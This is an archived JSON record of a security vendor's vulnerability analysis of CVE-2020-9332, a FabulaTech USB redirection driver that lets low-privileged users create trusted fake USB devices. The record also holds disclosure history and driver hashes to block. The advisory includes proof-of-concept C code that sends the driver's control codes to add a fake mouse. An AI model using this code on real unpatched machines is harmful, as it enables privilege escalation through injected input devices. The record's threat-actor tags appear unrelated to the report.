{
    "id": "4e512526-a867-47e7-a8d4-30ba44dc3b7d",
    "created_at": "2023-01-12T14:59:03.756213Z",
    "updated_at": "2025-03-27T02:09:30.257061Z",
    "deleted_at": null,
    "sha1_hash": "1877fe286f85dbaf3fc270f7e9e5eab1998dc35f",
    "title": "2020-06-17 - A Click from the Backyard - Analysis of CVE-2020-9332, a Vulnerable USB Redirection Software",
    "authors": "",
    "file_creation_date": "2022-05-28T16:48:28Z",
    "file_modification_date": "2022-05-28T16:48:28Z",
    "file_size": 1777580,
    "plain_text": "# A Click from the Backyard | Analysis of CVE-2020-9332, a Vulnerable USB Redirection Software\n\n**[labs.sentinelone.com/click-from-the-backyard-cve-2020-9332/](https://labs.sentinelone.com/click-from-the-backyard-cve-2020-9332/)**\n\nMichael Myngerbayev\n\n## Executive Summary\n\nFabulaTech software provides a wide range of products, allowing enterprises to\nconnect devices to endpoints remotely using an application for redirecting USB devices\nto remote sessions. Typically, FabulaTech supports Microsoft RDP, Teradici PCoIP, or\nCitrix ICA protocols.\nWhen installed, the software exposes a way for attackers to take over the device, by\neither adding a virtual keyboard or other devices.\nThe vulnerability represents a new attack vector that allows attackers to create fake\nUSB devices, fully trusted by the Windows operating system (kernel), to attack a\nmachine in unconventional and unexpected ways.\nWhile not all workforce is back to work on-prem, attacks of this nature could make the\ntransition back to the office much harder to secure.\nThe discovery was shared with the vendor, but there is no fix available.\n**Update: In light of this post, the vendor has informed us that they subsequently**\nimplemented a fix for CVE-2020-9332 in their USB for Remote Desktop product.\n\n## Introduction\n\n\n-----\n\nFabulaTech installs a bus driver as part of its USB for Remote Desktop software product.\nThe bus driver allows low privileged users to add a fully controlled software USB device,\nwhich could be used by an attacker to elevate privileges under certain common\ncircumstances. The driver is signed by FabulaTech and starts automatically with the\noperating system. The vulnerability was reported to the vendor on Jan 29 and Feb 4 (more\ndetails on our responsible disclosure below) and later submitted to MITRE. The vulnerability\nhas received the following ID: CVE-2020-9332.\n\nSome time ago we noticed unusual activity coming from the kernel on some of our clients’\ncomputers. This behavior led to interop issues and looked suspicious. This prompted us to\nlook deeper at the driver and discover the vulnerability detailed below.\n\n## USB for Remote Desktop\n\nUSB redirection software makes remote USB devices available across the network as if they\nwere connected to your computer. Client side software running on your local computer\ngathers information about the redirected device and passes it to the server running on the\nremote computer. The server in turn uses a bus driver to create and manipulate a software\ndevice that repeats all I/O made by the real device. Every time the device on the client side\nreads data from or writes data to the computer, the client software sends the request to the\nserver side to replay it by the bus driver, making the OS think that a real device is attached to\nthe remote computer.\n\n\n-----\n\n[More information regarding USB redirection can be found in this open source project.](https://sourceforge.net/p/usbip/git-windows/ci/master/tree/)\n\n## So What’s the Problem?\n\nWell, there wouldn’t be a problem if FabulaTech’s bus driver was only accessible to\nprivileged entities. Typically, drivers protect their device objects either by adding a security\ndescriptor that restricts access to system and admins only, or by enforcing security checks in\nthe driver itself. In this case, the controlling application should be a service running under a\nprivileged account.\n\nFor WDM drivers, the best way to assign a security descriptor is by using the\n[WdmlibIoCreateDeviceSecure routine. For KMDF drivers,](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdmsec/nf-wdmsec-wdmlibiocreatedevicesecure) [WdfDeviceInitAssignSDDLString](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdfdevice/nf-wdfdevice-wdfdeviceinitassignsddlstring)\n[does the job. A 2017 issue of NTInsider covers the topic in great detail.](https://www.osr.com/nt-insider/2017-issue1/making-device-objects-accessible-safe/)\n\nUnfortunately, the plain old IoCreateDevice routine does not provide a way to assign a\nsecurity descriptor upon device object creation. Instead, it assumes that the security\ndescriptor is defined in an INF file. This indulges developers to forget about applying a\nsecurity descriptor at all, leaving device objects accessible to everyone. Modern drivers\n[should use the WdmlibIoCreateDeviceSecure routine to create device objects, or even](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdmsec/nf-wdmsec-wdmlibiocreatedevicesecure)\nbetter, stick to the KMDF framework. More details on applying security descriptors to a\n[device object can be found in this article.](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/applying-security-descriptors-on-the-device-object)\n\nThe FabulaTech driver also calls the insecure IoCreateDevice routine:\n\nThis lets a non-privileged, low integrity user add and control a software device that is fully\ntrusted by the OS.\n\n\n-----\n\nIronically, FabulaTech services do run under LocalSystem account:\n\n\n-----\n\nThere are many malicious scenarios that could happen due to that kind of threat. For\nexample, an attacker can add a fake mouse pointer device and click ‘Yes’ in the UAC\nconsent window, or a fake keyboard could type commands in the context of the current user.\nSince these actions are coming from the software device, user interaction won’t be needed\nat all. If we assume that the product can simulate any USB device, then we can do more\nadvanced attacks like adding a USB-ethernet network card to perform a MITM attack and so\non.\n\n## USB and HID\n\nIn order to understand how to exploit this issue, we first have to be familiar with a little USB\nbackground, specifically with HIDs (Human Interface Devices).\n\nOne of the central concepts of USB protocol is the USB descriptor: a data structure that a\nUSB device returns when replying to requests from the host computer. Descriptors are a\ngreat way for devices to provide information about themselves. When a USB device gets\nplugged into the computer, the Windows kernel requests its descriptors to identify the device,\nits configurations, power options and other properties. Then the kernel loads drivers that\nmatch the device identifiers and sends a few more requests to set up the device.\n\nA USB device might have a few configurations that define which subdevices (interfaces) are\ncurrently active. Every interface represents an independent subdevice that shares the\nphysical container with other subdevices. e.g. a USB keyboard might have a builtin\ntouchpad. In this case the configuration should expose two interfaces: one for the keyboard\nand for the mouse pointer. A device with multiple interfaces is called a composite device.\nWindows treats USB interfaces as standalone devices, and each subdevice might match its\nown driver.\n\nThe overall scheme of descriptor relations looks like this:\n\n\n-----\n\nThere are a few types of USB descriptors: device, configuration, interface, endpoint and\nstring descriptors; for the full list and layout of the descriptors see the USB specifications at\n[usb.org. I will briefly explain how descriptors relate to each other to build up a USB device.](https://www.usb.org/documents)\n\nThe main USB descriptor is device descriptor. It contains general information about the\ndevice:\n```\ntypedef struct _USB_DEVICE_DESCRIPTOR {\n  UCHAR bLength;\n  UCHAR bDescriptorType;\n  USHORT bcdUSB;\n  UCHAR bDeviceClass;\n  UCHAR bDeviceSubClass;\n  UCHAR bDeviceProtocol;\n  UCHAR bMaxPacketSize0;\n  USHORT idVendor;\n  USHORT idProduct;\n  USHORT bcdDevice;\n  UCHAR iManufacturer;\n  UCHAR iProduct;\n  UCHAR iSerialNumber;\n  UCHAR bNumConfigurations;\n} USB_DEVICE_DESCRIPTOR, *PUSB_DEVICE_DESCRIPTOR;\n\n```\nThe most important fields of the device descriptor are: product ID, vendor ID and the number\nof USB configurations.\n\n\n-----\n\n```\ntypedef struct _USB_CONFIGURATION_DESCRIPTOR {\n  UCHAR bLength;\n  UCHAR bDescriptorType;\n  USHORT wTotalLength;\n  UCHAR bNumInterfaces;\n  UCHAR bConfigurationValue;\n  UCHAR iConfiguration;\n  UCHAR bmAttributes;\n  UCHAR MaxPower;\n} USB_CONFIGURATION_DESCRIPTOR, *PUSB_CONFIGURATION_DESCRIPTOR;\n\n```\nThe USB configuration is used to manage interfaces and power options of the device. USB\nconfiguration descriptor is a container for USB interface descriptors. It groups interfaces\nletting the device driver decide which interfaces should be enabled or disabled at any given\nmoment.\n\nImagine there is a keyboard with a builtin touchpad as mentioned earlier. The keyboard\nneeds a driver and the vendor might want to ship the driver together with the keyboard. One\nof the possible solutions is to add a tiny USB mass storage to the keyboard. The storage\nshould carry the driver and a managing application. However, the vendor doesn’t want to\nexpose the storage once the driver gets installed. Here is where configurations come into\nplay. The keyboard might have two configurations: the firstconfiguration exposes three\ninterfaces: the keyboard itself, the touchpad and the storage. Once the driver gets installed, it\nswitches the keyboard to the second configuration that exposes two interfaces: the keyboard\nand the touchpad.\n\nEvery configuration descriptor is followed by interface descriptors belonging to the\nconfiguration. bNumInterfaces field designates the number of descriptors. Interface\ndescriptor in turn is a container for endpoint descriptors.\n```\ntypedef struct _USB_INTERFACE_DESCRIPTOR {\n  UCHAR bLength;\n  UCHAR bDescriptorType;\n  UCHAR bInterfaceNumber;\n  UCHAR bAlternateSetting;\n  UCHAR bNumEndpoints;\n  UCHAR bInterfaceClass;\n  UCHAR bInterfaceSubClass;\n  UCHAR bInterfaceProtocol;\n  UCHAR iInterface;\n} USB_INTERFACE_DESCRIPTOR, *PUSB_INTERFACE_DESCRIPTOR;\n\n```\nSimilar to the configuration descriptor, the interface descriptor is followed by endpoint\ndescriptors. Endpoints are similar to network ports: they are entities that actually receive\ninformation from the host or send it back to the host. Like network ports, endpoints are\naddressed by a number called bEndpointAddress. bEndpointAddress and a few other fields\ntogether represent an endpoint descriptor:\n\n\n-----\n\n```\ntypedef struct _USB_ENDPOINT_DESCRIPTOR {\n  UCHAR bLength;\n  UCHAR bDescriptorType;\n  UCHAR bEndpointAddress;\n  UCHAR bmAttributes;\n  USHORT wMaxPacketSize;\n  UCHAR bInterval;\n} USB_ENDPOINT_DESCRIPTOR, *PUSB_ENDPOINT_DESCRIPTOR;\n\n## USB Request Block\n\n```\nOne more important concept in the USB protocol is URB. USB device drivers are protocol\ndrivers: they use USB Request Blocks (URB) to interact with devices they back up. USB\ndrivers don’t access hardware resources like IO ports, IO memory or interrupts directly.\nInstead, they submit URBs to the USB device stacks (usually their own) offloading the actual\nhardware interaction to the lower drivers. A URB packet consists of a fixed size header that\ndescribes the URB function and a variable size part that depends on the URB function.\nThese functions correspond to the requests described earlier, they can: select active\nconfiguration, fetch device descriptors, perform data transfer to or from an endpoint, and so\non. Here is an example of a data transfer URB:\n```\nstruct _URB_HEADER {\n  USHORT  Length;\n  USHORT  Function;\n  USBD_STATUS Status;\n  PVOID  UsbdDeviceHandle;\n  ULONG  UsbdFlags;\n};\nstruct _URB_BULK_OR_INTERRUPT_TRANSFER {\n  struct _URB_HEADER Hdr;\n  USBD_PIPE_HANDLE  PipeHandle;\n  ULONG    TransferFlags;\n  ULONG    TransferBufferLength;\n  PVOID    TransferBuffer;\n  PMDL     TransferBufferMDL;\n  struct _URB   *UrbLink;\n  struct _URB_HCD_AREA hca;\n};\n\n```\nOnce submitted, the URB travels to the lowest level drivers that manage USB devices\nplugged into the USB ports. The lowest driver parses the URB, converts it to the physical\nrepresentation and wires it to the plugged device. Protocol approach makes USB device\ndriver development easy, if driver development can ever be called “easy”.\n\nTo make things even more uniform, HID was developed. The idea of HID is to generalize\nuser input and output to sets of predefined reports and to have generic drivers, e.g.\nkbdhid.sys for keyboard, that convert these reports to the operating system events. Thus, a\ndevice that supports HID does not need an accompanying driver at all.\n\n\n-----\n\nSuch an architecture simplifies redirection of USB devices. To redirect a USB device one\nneeds to sniff URBs flowing to the real device and to repeat them on the virtual device.\n\n## PoC Time!\n\nAs mentioned earlier FabulaTech’s solution fetches the real device data from the network\nand then repeats it to the software device. FabulaTech implements fetching in a user mode\nservice while the driver acts just as an intermediary between the service and the OS. Device\nlogic and replies should actually be implemented in the user mode. The driver exposes\ncontrol codes that allow the following: create a device, fetch a URB from the OS and reply to\nthe URB. Device creation code gets the device descriptor as input, the other two get and\nreturn URBs. The input and output parameters are such that the driver’s private header is\nfollowed by the URB, which is followed by the HID report.\n\nSince the vulnerability wasn’t patched by the vendor we will not publish the full fledged\n[exploit that bypasses the UAC. Following the standard 90-day policy we kept this post under](https://googleprojectzero.blogspot.com/2020/01/policy-and-disclosure-2020-edition.html)\nembargo till 29th of April. Since the embargo period has expired and no exploit at all is\nboring, we here publish a PoC that simply adds a fake mouse device using the vulnerable\ndriver.\n\nFirst, let’s add the device with IOCTL_FT_ADD_DEVICE (0x222000) control code. The\ncontrol handler gets the device descriptor in the input buffer. The most important part of the\ndescriptor is device ID, the ID that identifies the device and lets the OS find the matching\n\n\n-----\n\ndriver. The PoC uses VendorID 0E0F and ProductID 0003, which is a VMWare Virtual USB\nmouse.\n```\n/*************/\nHANDLE Event = CreateEventW(nullptr, TRUE, FALSE, nullptr);\n//Fill a few event handles\nPHANDLE pEvent = (PHANDLE)(&DeviceDesc[0x14]);\npEvent[0] = pEvent[1] = pEvent[2] = Event;\nDWORD Returned;\nBOOL r = DeviceIoControl(Device, IOCTL_FT_ADD_DEVICE, DeviceDesc, sizeof(DeviceDesc),\nDeviceDesc, sizeof(DeviceDesc), &Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] DeviceDescn\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\n/*************/\n\n```\nSecond, we have to reply to a few USB descriptor requests from the OS as if we were a real\ndevice. These requests are: select configuration, set idle, get raw report descriptor and so\non. 2 control codes, IOCTL_FT_GET_REQUEST(0x22200B) and\nIOCTL_FT_SET_REQUEST(0x222017) do the job:\n\n\n-----\n\n```\n/ /\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, SelectConfig, sizeof(SelectConfig),\nSelectConfig, sizeof(SelectConfig), &Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] SelectConfign\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, GetMsDesc, sizeof(GetMsDesc),\nGetMsDesc, sizeof(GetMsDesc), &Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] GetMsDescn\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, SetIdle, sizeof(SetIdle), SetIdle,\nsizeof(SetIdle), &Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] SetIdlen\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, RawReportDescriptor,\nsizeof(RawReportDescriptor), RawReportDescriptor, sizeof(RawReportDescriptor),\n&Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] RawReportDescriptorn\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, SetIdle2, sizeof(SetIdle2),\nSetIdle2, sizeof(SetIdle2), &Returned, 0);\nif (r == TRUE)\n{\n\n```\n\n-----\n\n```\n  printf( [+] SetIdle2n );\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\nr = DeviceIoControl(Device, IOCTL_FT_SET_REQUEST, RawReportDescriptor2,\nsizeof(RawReportDescriptor2), RawReportDescriptor2, sizeof(RawReportDescriptor2),\n&Returned, 0);\nif (r == TRUE)\n{\n  printf(\"[+] RawReportDescriptor2n\");\n}\nelse\n{\n  printf(\"DeviceIoControl failed: %dn\", GetLastError());\n}\nSleep(1000);\n/*************/\n\n```\nExecuting this snippet adds a very fake mouse to the OS:\n\n\n-----\n\n## No Fix So Far\n\nUnfortunately, the vendor did not acknowledge the vulnerability (Update: see below!). We\ntried to contact the vendor via email on Jan 29, 2020 and Feb 4, 2020; however, we received\nno response. We also posted a message to the FabulaTech forum, but the message was\ndeleted by administrators. To reduce the possible security impact from CVE-2020-9332, we\nrecommend refraining from using USB for Remote Desktop until the vendor addresses the\nissue. We will update the post if the flaw gets fixed.\n\nIf you are not protected with SentinelOne agent, and until an official patch release by\nFabulaTech, we recommend blocking the following SHA1 (the vulnerable driver – partial list):\n\nF93A6016AC90A4FF327DED9E2561C557B65D3C78\n\n0730F138C1359A83367E8B289E5745D5A4452CE5\n\nDF3EE526243CB6EA134E8C372E7514511817C3F6\n\n81672069483826866DA5E2C224DA69FC03B8D67F\n\n1036413C72B8CBB945E6CED0DC1F2844F7984ED0\n\n\n-----\n\n89309C19A6DB44807352F41709A26C4411CE192F\n41C6A4220FDAF62D04A9D7B4D15D566238A3EBDE\nD7392470DB0FA55F35F4DACFE1706558665FFD24\n057397C8058B05A832BB9CBF30B52EF38A046FDE\n0F6B605D4F7AB1FD21E4A2385C6B0937DECB6280\nCD6D2D56882C61B13F6A74D0789EB5196E140C53\n68A7A3DC2090E8629CC19A6F9E07566E3FBC6483\n\n## Vendor Response\n\nSince we published this post, the vendor has reached out to SentinelLabs to indicate that\nCVE-2020-9332 has been fixed in USB for Remote Desktop as of version 6.0.2. The vendor\ndid not indicate whether the vulnerability had been fixed across all affected Fabulatech\nproducts.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-17 - A Click from the Backyard - Analysis of CVE-2020-9332, a Vulnerable USB Redirection Software.pdf"
    ],
    "report_names": [
        "2020-06-17 - A Click from the Backyard - Analysis of CVE-2020-9332, a Vulnerable USB Redirection Software.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535543,
    "ts_updated_at": 1743041370,
    "ts_creation_date": 1653756508,
    "ts_modification_date": 1653756508,
    "files": {
        "pdf": "https://archive.orkl.eu/1877fe286f85dbaf3fc270f7e9e5eab1998dc35f.pdf",
        "text": "https://archive.orkl.eu/1877fe286f85dbaf3fc270f7e9e5eab1998dc35f.txt",
        "img": "https://archive.orkl.eu/1877fe286f85dbaf3fc270f7e9e5eab1998dc35f.jpg"
    }
}